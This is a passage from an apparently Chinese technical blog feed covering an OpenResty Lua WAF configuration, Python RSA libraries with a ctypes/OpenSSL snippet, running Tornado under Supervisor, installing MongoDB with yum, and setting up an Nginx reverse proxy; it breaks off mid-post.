-<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">RulePath = <span class="string">"/usr/local/openresty/nginx/conf/waf/wafconf"</span></span><br><span class="line"><span class="comment">--规则存放目录</span></span><br><span class="line">attacklog = <span class="string">"off"</span></span><br><span class="line"><span class="comment">--是否开启攻击信息记录，需要配置logdir</span></span><br><span class="line">logdir = <span class="string">"/usr/local/openresty/nginx/logs/hack/"</span></span><br><span class="line"><span class="comment">--log存储目录，该目录需要用户自己新建，且需要nginx用户的可写权限</span></span><br><span class="line">UrlDeny=<span class="string">"on"</span></span><br><span class="line"><span class="comment">--是否拦截url访问</span></span><br><span class="line">Redirect=<span class="string">"on"</span></span><br><span class="line"><span class="comment">--是否拦截后重定向</span></span><br><span class="line">CookieMatch = <span class="string">"on"</span></span><br><span class="line"><span class="comment">--是否拦截cookie攻击</span></span><br><span class="line">postMatch = <span class="string">"on"</span> </span><br><span class="line"><span class="comment">--是否拦截post攻击</span></span><br><span class="line">whiteModule = <span class="string">"on"</span> </span><br><span class="line"><span class="comment">--是否开启URL白名单</span></span><br><span class="line">black_fileExt=&#123;<span class="string">"php"</span>,<span class="string">"jsp"</span>&#125;</span><br><span class="line"><span class="comment">--填写不允许上传文件后缀类型</span></span><br><span class="line">ipWhitelist=&#123;<span class="string">"127.0.0.1"</span>&#125;</span><br><span class="line"><span class="comment">--ip白名单，多个ip用逗号分隔</span></span><br><span class="line">ipBlocklist=&#123;<span class="string">"1.0.0.1"</span>&#125;</span><br><span class="line"><span class="comment">--ip黑名单，多个ip用逗号分隔</span></span><br><span class="line">CCDeny=<span class="string">"on"</span></span><br><span class="line"><span class="comment">--是否开启拦截cc攻击(需要nginx.conf的http段增加lua_shared_dict limit 10m;)</span></span><br><span class="line">CCrate = <span class="string">"100/60"</span></span><br><span class="line"><span class="comment">--设置cc攻击频率，单位为秒.</span></span><br><span class="line"><span class="comment">--默认1分钟同一个IP只能请求同一个地址100次</span></span><br><span class="line">html=<span class="string">[[Please go away~~]]</span></span><br><span class="line"><span class="comment">--警告内容,可在中括号内自定义</span></span><br><span class="line">备注:不要乱动双引号，区分大小写</span><br></pre></td></tr></table></figure>
-<p>logdir目录尤其注意，需要用户自行创建，并且设置nginx用户可写，否则不会生成拦截日志也不会报错。</p>
-<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><p>规则文件在wafconf下面，分为:</p>
-<ul>
-<li><p><code>args</code></p>
-</li>
-<li><p><code>cookie</code> </p>
-</li>
-<li><p><code>post</code></p>
-</li>
-<li><p><code>url</code></p>
-</li>
-<li><p><code>user-agent</code></p>
-</li>
-<li><p><code>whiteurl</code></p>
-</li>
-</ul>
-<p>文件一行一条规则，基于正则表达式编写，你可以根据你的需要进行修改。</p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>在部署配置完成之后，执行命令systemctl restart nginx重启nginx服务，即可看到WAF效果：</p>
-<p><img src="/images/waf-example.png" alt="waf-example"></p>
-<p>拦截页面内容配置在config.lua的html字段中，你可以自定义更美观的样式。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[python实现rsa的几种方案]]></title>
-      <url>http://sha256.cc/2015/12/09/4-python%E5%AE%9E%E7%8E%B0rsa%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%A1%88/</url>
-      <content type="html"><![CDATA[<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a><a href="https://pypi.python.org/pypi/rsa" target="_blank" rel="external">rsa</a></h2><p>这是一个纯python实现的库，不依赖底层文件，优点是部署容易，缺点是速度比较慢，原本是斯坦福大学教学演示用的，现在由Sybren A. Stüvel专人维护。 生产环境不太建议使用此库。</p>
-<a id="more"></a>
-<p><strong> 解密性能: 70ms左右 </strong></p>
-<blockquote>
-<p>Python-RSA is a pure-Python RSA implementation. It supports encryption and decryption, signing and verifying signatures, and key generation according to PKCS#1 version 1.5. It can be used as a Python library as well as on the commandline. The code was mostly written by Sybren A. Stüvel.</p>
-</blockquote>
-<h2 id="pycrypto"><a href="#pycrypto" class="headerlink" title="pycrypto"></a><a href="https://pypi.python.org/pypi/pycrypto" target="_blank" rel="external">pycrypto</a></h2><p>这个库应用的比较多，不局限于rsa，实现了大多数常用的加密算法。底层应该也是自己实现的，因为相比后面一个调用系统模块的库它的rsa算法要慢很多。</p>
-<p><strong> 解密性能: 40ms左右 </strong></p>
-<blockquote>
-<p>This is a collection of both secure hash functions (such as SHA256 and RIPEMD160), and various encryption algorithms (AES, DES, RSA, ElGamal, etc.). The package is structured to make adding new modules easy. This section is essentially complete, and the software interface will almost certainly not change in an incompatible way in the future; all that remains to be done is to fix any bugs that show up. If you encounter a bug, please report it in the Launchpad bug tracker at…</p>
-</blockquote>
-<h2 id="M2Crypto"><a href="#M2Crypto" class="headerlink" title="M2Crypto"></a><a href="https://pypi.python.org/pypi/M2Crypto" target="_blank" rel="external">M2Crypto</a></h2><p>这个库是对Openssl库接口的python封装，实际运算都是调用系统的libssl.so/libcryto.so，不过安装的时候比较麻烦，需要依赖swig等工具 (<a href="https://gitlab.com/m2crypto/m2crypto_demo" target="_blank" rel="external">demo</a>)。</p>
-<p><strong> 解密性能: 7ms左右 </strong></p>
-<h2 id="ctypes-openssl"><a href="#ctypes-openssl" class="headerlink" title="ctypes+openssl"></a>ctypes+openssl</h2><p>以上列举的几种方法都有一个问题，就是不能利用多核。当我调用解密接口比较集中的时候，接口耗时会成倍增加，即便是最快的M2Crypto，瞬时10个并发的时候最坏情况就会达到70ms左右。</p>
-<p>因此我尝试直接使用ctypes调用openssl库突破的GIL的限制，不过ctypes调用so文件有点麻烦的就是看不到so提供的函数名，反复查阅openssl的文档和参考c代码之后，最终调试成功。结果也非常令人满意，达到了1ms级，瞬时100个并发也能维持在毫秒级的性能。</p>
-<p><strong> 解密性能: 1ms左右 </strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line">_libcrypto = find_library(<span class="string">'crypto'</span>)</span><br><span class="line">sign = <span class="string">'iYzF0bn6kwUtsqLmTSx8fx...'</span></span><br><span class="line">cryptor = ctypes.cdll.LoadLibrary(_libcrypto)</span><br><span class="line">RSA_size                    = cryptor.RSA_size</span><br><span class="line">BIO_free                    = cryptor.BIO_free</span><br><span class="line">RSA_free                    = cryptor.RSA_free</span><br><span class="line">RSA_decrypt                 = cryptor.RSA_private_decrypt</span><br><span class="line">PEM_read_bio_RSAPrivateKey  = cryptor.PEM_read_bio_RSAPrivateKey</span><br><span class="line">privkey = <span class="string">'''-----BEGIN RSA PRIVATE KEY-----...-----END RSA PRIVATE KEY-----'''</span>    </span><br><span class="line">bio = cryptor.BIO_new_mem_buf(privkey, <span class="number">-1</span>)</span><br><span class="line">key = PEM_read_bio_RSAPrivateKey(bio, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">r = BIO_free(bio)</span><br><span class="line"><span class="keyword">if</span> r != <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># break here</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'BIO_free error'</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">rsa_size = RSA_size(key)</span><br><span class="line">rsa = ctypes.create_string_buffer(rsa_size)</span><br><span class="line">ret = RSA_decrypt(rsa_size, sign, rsa, key, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p>其中privkey是私钥，sign是我要解密的数据。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li><p>加解密这一块，Linux下面能用openssl就用openssl，绝对比自己实现快。</p>
-</li>
-<li><p>python+ctypes可以让你享受python便利的同时还能拥有卓越的性能，不过ctypes创建的内存空间记得要自己释放，python垃圾收集机制对其无效。</p>
-</li>
-<li><p>一般情况下推荐用pycrypto库，文档比较全面。</p>
-</li>
-</ol>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[利用supervisor部署多个tornado服务]]></title>
-      <url>http://sha256.cc/2015/12/09/3-%E5%88%A9%E7%94%A8supervisor%E9%83%A8%E7%BD%B2%E5%A4%9A%E4%B8%AAtornado%E6%9C%8D%E5%8A%A1/</url>
-      <content type="html"><![CDATA[<p>单个Tornado服务由于文件句柄和处理请求数的限制不能够很好得满足实际的工作需求，因此我们搭建多个实例共同服务，但是Tornado自身没有这样的集群管理能力，所以我们需要借助第三方工具——Supervisor。<br><a id="more"></a><br><a href="http://supervisord.org/" target="_blank" rel="external">Supervisor</a> 是用Python编写的运行在Linux上的进程控制系统，用于监控和管理批量的服务进程，当前版本3.3.0。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install supervisor</span><br></pre></td></tr></table></figure>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span>_supervisord_conf &gt; /etc/supervisord.conf</span><br></pre></td></tr></table></figure>
-<h3 id="修改默认配置"><a href="#修改默认配置" class="headerlink" title="修改默认配置"></a>修改默认配置</h3><p>编辑<code>/etc/supervisord.conf</code>：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 修改unix socket文件位置，因为不清楚的原因，默认文件位置工作一段时间之后会不正常</span></span><br><span class="line"><span class="section">[unix_http_server]</span></span><br><span class="line"><span class="attr">file</span>=/home/libraco/conf/supervisor.sock   ; (the path to the socket file)</span><br><span class="line"><span class="section"></span><br><span class="line">[supervisorctl]</span></span><br><span class="line"><span class="attr">serverurl</span>=unix:///home/libraco/conf/supervisor.sock ; use a unix:// URL  for a unix socket</span><br><span class="line"></span><br><span class="line"><span class="comment">; 取消注释，并修改配置文件目录</span></span><br><span class="line"><span class="section">[include]</span></span><br><span class="line"><span class="attr">files</span> = etc/supervisor/*.ini</span><br></pre></td></tr></table></figure>
-<h3 id="配置Tornado"><a href="#配置Tornado" class="headerlink" title="配置Tornado"></a>配置Tornado</h3><p>在<code>/etc/supervisor/</code>下添加<code>tornado.ini</code>文件:</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[group:tornadoes]</span></span><br><span class="line"><span class="attr">programs</span>=tornado-<span class="number">8000</span>,tornado-<span class="number">8001</span>,tornado-<span class="number">8002</span>,tornado-<span class="number">8003</span></span><br><span class="line"><span class="section"></span><br><span class="line">[program:tornado-8000]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;*命令路径,如果使用python启动的程序应该为 python /home/test.py, </span></span><br><span class="line"><span class="comment">;不建议放入/home/user/, 对于非user用户一般情况下是不能访问</span></span><br><span class="line"><span class="attr">command</span>=python /var/www/main.py --port=<span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;执行目录,若有/home/supervisor_test/test1.py</span></span><br><span class="line"><span class="comment">;将directory设置成/home/supervisor_test</span></span><br><span class="line"><span class="comment">;则command只需设置成python test1.py</span></span><br><span class="line"><span class="comment">;否则command必须设置成绝对执行目录</span></span><br><span class="line"><span class="attr">directory</span>=/var/www</span><br><span class="line"></span><br><span class="line"><span class="comment">;*以www-data用户执行</span></span><br><span class="line"><span class="attr">user</span>=www-data</span><br><span class="line"></span><br><span class="line"><span class="comment">;如果是true,当supervisor启动时,程序将会自动启动</span></span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;*自动重启</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;标准输出重定向到文件，标准错误重定向到标准输出</span></span><br><span class="line"><span class="attr">stdout_logfile</span>= /var/log/tornado-<span class="number">8000</span>.log</span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="section"></span><br><span class="line">[program:tornado-8001]</span></span><br><span class="line"><span class="attr">command</span>=python /var/www/main.py --port=<span class="number">8001</span></span><br><span class="line"><span class="attr">directory</span>=/var/www</span><br><span class="line"><span class="attr">user</span>=www-data</span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">stdout_logfile</span>= /var/log/tornado-<span class="number">8001</span>.log</span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="section"></span><br><span class="line">[program:tornado-8002]</span></span><br><span class="line"><span class="attr">command</span>=python /var/www/main.py --port=<span class="number">8002</span></span><br><span class="line"><span class="attr">directory</span>=/var/www</span><br><span class="line"><span class="attr">user</span>=www-data</span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">stdout_logfile</span>= /var/log/tornado-<span class="number">8002</span>.log</span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="section"></span><br><span class="line">[program:tornado-8003]</span></span><br><span class="line"><span class="attr">command</span>=python /var/www/main.py --port=<span class="number">8003</span></span><br><span class="line"><span class="attr">directory</span>=/var/www</span><br><span class="line"><span class="attr">user</span>=www-data</span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">stdout_logfile</span>= /var/log/tornado-<span class="number">8003</span>.log</span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p>这里我们定义了一个名为tornadoes的组，包含四个成员tornado-8000、tornado-8001、tornado-8002、tornado-8003。</p>
-<p>program定义进程名，每个program有单独的详细配置。</p>
-<p>至此我们的配置工作基本完成。</p>
-<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/supervisord -c /etc/supervisord.conf</span><br></pre></td></tr></table></figure>
-<h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /lib/systemd/system/supervisor.service</span><br></pre></td></tr></table></figure>
-<p>写入如下内容:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=supervisor</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf</span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">$ sudo systemctl start supervisor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机自启动</span></span><br><span class="line">$ sudo systemctl <span class="built_in">enable</span> supervisor</span><br></pre></td></tr></table></figure>
-<h2 id="管理服务"><a href="#管理服务" class="headerlink" title="管理服务"></a>管理服务</h2><p>管理服务需要用到supervisorctl命令，这个命令必须在Supervisord启动之后执行，它通过发送指令给Supervisord达到管理的目的。</p>
-<p>常用的指令有：</p>
-<ul>
-<li><p><code>supervisorctl reload</code><br> 重启Supervisord服务</p>
-</li>
-<li><p><code>supervisorctl restart &lt;name&gt;|&lt;gname&gt;</code><br>重启某个服务或某一组服务</p>
-</li>
-<li><p><code>supervisorctl status</code><br>查看服务运行的状态和时间</p>
-</li>
-</ul>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>如果Tornado集群部署在Nginx反向代理之后，要获取到远程真实IP，除了必要的Nginx配置之外，Tornado也需要明确指定xheaders=True,官方有说明：</p>
-<blockquote>
-<p>If xheaders is True, we support the X-Real-Ip/X-Forwarded-For and X-Scheme/X-Forwarded-Proto headers, which override the remote IP and URI scheme/protocol for all requests. These headers are useful when running Tornado behind a reverse proxy or load balancer. The protocol argument can also be set to https if Tornado is run behind an SSL-decoding proxy that does not set one of the supported xheaders.<br>具体代码示例：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r"/"</span>, MainHandler),</span><br><span class="line">])</span><br><span class="line">application.listen(options.port, <span class="string">'127.0.0.1'</span>, xheaders=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Centos使用Yum安装配置Mongodb]]></title>
-      <url>http://sha256.cc/2015/12/03/2-Centos%E4%BD%BF%E7%94%A8Yum%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMongodb/</url>
-      <content type="html"><![CDATA[<h2 id="安装Mongodb"><a href="#安装Mongodb" class="headerlink" title="安装Mongodb"></a>安装Mongodb</h2><p>使用Yum，我们可以很方便的安装Mongodb:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install mongodb mongodb-server</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<p>yum会自动帮我们生成Mongodb的配置文件，其中最主要的配置文件/etc/mongod.conf部分内容如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Comma separated list of ip addresses to listen on (all local ips by default)</span></span><br><span class="line"><span class="built_in">bind</span>_ip = 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify port number (27017 by default)</span></span><br><span class="line"><span class="comment">#port = 27017</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fork server process (false by default)</span></span><br><span class="line">fork = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Full path to pidfile (if not set, no pidfile is created)</span></span><br><span class="line">pidfilepath = /var/run/mongodb/mongod.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log file to send write to instead of stdout - has to be a file, not directory</span></span><br><span class="line">logpath = /var/<span class="built_in">log</span>/mongodb/mongod.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternative directory for UNIX domain sockets (defaults to /tmp)</span></span><br><span class="line">unixSocketPrefix = /var/run/mongodb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory for datafiles (defaults to /data/db/)</span></span><br><span class="line">dbpath = /var/lib/mongodb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable/Disable journaling (journaling is on by default for 64 bit)</span></span><br><span class="line"><span class="comment">#journal = true</span></span><br><span class="line"><span class="comment">#nojournal = true</span></span><br></pre></td></tr></table></figure>
-<p>默认配置指定了IP、端口、数据文件、日志文件等等，十分详尽，可以根据自己的实际情况进行修改，一般用默认的就行了。</p>
-<h2 id="配置开机自启动"><a href="#配置开机自启动" class="headerlink" title="配置开机自启动"></a>配置开机自启动</h2><p>打开/etc/rc.d/rc.local文件，追加/usr/bin/mongod –config /etc/mongod.conf至行尾，保存即可。</p>
-<h2 id="尝试启动"><a href="#尝试启动" class="headerlink" title="尝试启动"></a>尝试启动</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service mongod start</span><br></pre></td></tr></table></figure>
-<p>结果失败了，提示我使用指令systemctl status mongodb查看原因，指令输出类似这样:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mongodb.service - High-performance, schema-free document-oriented database</span><br><span class="line">        Loaded: loaded (/usr/lib/systemd/system/mongodb.service; enabled)</span><br><span class="line">        Active: failed (Result: <span class="built_in">exit</span>-code) since Mi 2013-04-03 15:48:01 EEST; 3min 13s ago</span><br><span class="line">        Process: 1756 ExecStart=/usr/bin/mongod --quiet --config /etc/mongodb.conf (code=exited, status=14)</span><br><span class="line"></span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libstdc++.so.6(_ZNSt6localeC1EPKc+0x71b) [0x7f60471c952b]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libboost_filesystem.so.1.53.0(_ZN5boost10filesystem4path7codecvtEv+0x4f) [0x7f6047adfb6f]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libboost_filesystem.so.1.53.0(_ZNK5boost10filesystem4path14root_directoryEv+0x114) [0x7f6047ae1344]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libboost_filesystem.so.1.53.0(_ZN5boost10filesystem8absoluteERKNS0_4pathES3_+0x3e) [0x7f6047add16e]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/bin/mongod(_ZN5mongo27initializeServerGlobalStateEb+0xf3) [0x94<span class="built_in">fc</span>73]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/bin/mongod(main+0x234) [0x7591f4]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libc.so.6(__libc_start_main+0xf5) [0x7f60468b7a15]</span><br><span class="line">apr 03 15:48:01 echelon mongod[1756]: /usr/bin/mongod() [0x76bcd5]</span><br><span class="line">apr 03 15:48:01 echelon systemd[1]: mongodb.service: main process exited, code=exited, status=14/n/a</span><br><span class="line">apr 03 15:48:01 echelon systemd[1]: Unit mongodb.service entered failed state</span><br></pre></td></tr></table></figure>
-<p>仍然看不出哪里有问题，直到google到了这样的字眼sudo chown -R mongodb: /var/{lib,log}/mongodb，恍然大悟。</p>
-<p>使用Yum安装Mongodb会默认创建mongo用户,该用户的家目录是/var/lib/mongodb, 但是日志文件/var/log/mongodb/mongod.log和进程ID文件/var/run/mongodb/mongod.pid在其他的目录下面，这些目录属主不是mongodb用户，所以写入的时候会报权限问题。</p>
-<p>修改目录/var/log/mongodb和/var/run/mongodb属主为monodb即可。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Yum安装软件十分简单，但是由于Mongodb的安装包忽略了权限问题，而且出错日志十分不明显，导致我花费数十分钟才解决。</p>
-<p>其实Linux下权限问题十分常见，发生问题不知道原因的时候都可以往这方面尝试一下。</p>
-<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>后来想了一下，应该不是安装包的问题，这问题未免也太低级了。</p>
-<p>极有可能是我安装好的时候使用自己的帐号运行过服务，所以产生的配置文件及目录的属主是我平常用的帐号，因此mongodb这个用户没有写入和执行权限。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Nginx配置多域名反向代理]]></title>
-      <url>http://sha256.cc/2015/12/03/1-Nginx%E9%85%8D%E7%BD%AE%E5%A4%9A%E5%9F%9F%E5%90%8D%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
-      <content type="html"><![CDATA[<p>Nginx是一款用C语言编写的高性能Web服务器，常常架设在其他Web服务的外层，用于负载均衡、缓存静态文件、反向代理等。所谓反向代理，就是部署在服务器端转发请求的代理服务，用户请求通过它到达真正的后端资源。<a id="more"></a>与此对应的“正向”代理，是部署在客户端的代理服务，对外的网络请求实际由它发出。打个比方，正向代理就像是你叫你儿子帮你去打酱油，你儿子就是一个正向代理。反向代理就是你去酱油店买酱油，酱油实际上是老板找隔壁借来再卖给你，你并不知情，此时酱油店老板就是一个反向代理。从这个比方中也很好理解，正向代理对请求方是可知的，而反向代理对于请求方来说一般是透明的、不可知的。</p>
-<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><p>使用Yum，我们可以很方便的安装Nginx(apt-get是完全类似的):</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure>
-<p>打开nginx的配置文件/etc/nginx/nginx.conf，长这样:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For more information on configuration, see:</span></span><br><span class="line"><span class="comment">#   * Official English Documentation: http://nginx.org/en/docs/</span></span><br><span class="line"><span class="comment">#   * Official Russian Documentation: http://nginx.org/ru/docs/</span></span><br><span class="line"></span><br><span class="line">user nginx;</span><br><span class="line">worker_processes auto;</span><br><span class="line">error_<span class="built_in">log</span> /var/<span class="built_in">log</span>/nginx/error.log;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">	<span class="built_in">log</span>_format  main  <span class="string">'$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">						<span class="string">'$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">						<span class="string">'"$http_user_agent" "$http_x_forwarded_for"'</span>;</span><br><span class="line"></span><br><span class="line">	access_<span class="built_in">log</span>  /var/<span class="built_in">log</span>/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">	sendfile            on;</span><br><span class="line">	tcp_nopush          on;</span><br><span class="line">	tcp_nodelay         on;</span><br><span class="line">	keepalive_timeout   65;</span><br><span class="line">	types_<span class="built_in">hash</span>_max_size 2048;</span><br><span class="line"></span><br><span class="line">	include             /etc/nginx/mime.types;</span><br><span class="line">	default_<span class="built_in">type</span>        application/octet-stream;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Load modular configuration files from the /etc/nginx/conf.d directory.</span></span><br><span class="line">	<span class="comment"># See http://nginx.org/en/docs/ngx_core_module.html#include</span></span><br><span class="line">	<span class="comment"># for more information.</span></span><br><span class="line">	include /etc/nginx/conf.d/*.conf;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line">		listen       80 default_server;</span><br><span class="line">		listen       [::]:80 default_server;</span><br><span class="line">		server_name  _;</span><br><span class="line">		root         /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">		<span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line">		include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">		location / &#123;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		error_page 404 /404.html;</span><br><span class="line">			location = /40x.html &#123;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		error_page 500 502 503 504 /50x.html;</span><br><span class="line">			location = /50x.html &#123;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h2><p>在/etc/nginx/conf.d/目录下新建一个配置文件reverse_proxy.conf，输入以下内容:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upstream wx_server &#123;</span><br><span class="line">	server localhost:8001;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy_temp_path     /etc/nginx/proxy_temp;</span><br><span class="line">proxy_cache_path    /etc/nginx/proxy_cache levels=1:2 keys_zone=cache_one:100m inactive=1d max_size=1g;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name blog.hustlibraco.com hustlibraco.com;</span><br><span class="line"></span><br><span class="line">	location ~ .*\.(gif|jpg|png|css|js|ico|swf)(.*) &#123;</span><br><span class="line">		proxy_pass http://localhost:8000;</span><br><span class="line">		proxy_redirect off;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header Host <span class="variable">$host</span>;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"></span><br><span class="line">		proxy_cache cache_one;</span><br><span class="line">		proxy_cache_valid 200 304 5m;</span><br><span class="line">		proxy_cache_key <span class="variable">$host</span><span class="variable">$uri</span><span class="variable">$is_args</span><span class="variable">$args</span>;</span><br><span class="line">		expires 30d;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://localhost:8000;</span><br><span class="line">		proxy_redirect off;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header Host <span class="variable">$host</span>;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	access_<span class="built_in">log</span>  /var/<span class="built_in">log</span>/nginx/blog_hustlibraco_com_access.log;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name wx.hustlibraco.com;</span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://wx_server;</span><br><span class="line">		proxy_redirect off;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header Host <span class="variable">$host</span>;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">		proxy_<span class="built_in">set</span>_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	access_<span class="built_in">log</span>  /var/<span class="built_in">log</span>/nginx/wx_hustlibraco_com_access.log;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其中两段server开头的配置指明了代理的规则，我们逐一解释下这些配置:</p>
-<ul>
-<li><p><code>listen 80</code><br>监听80端口</p>
-</li>
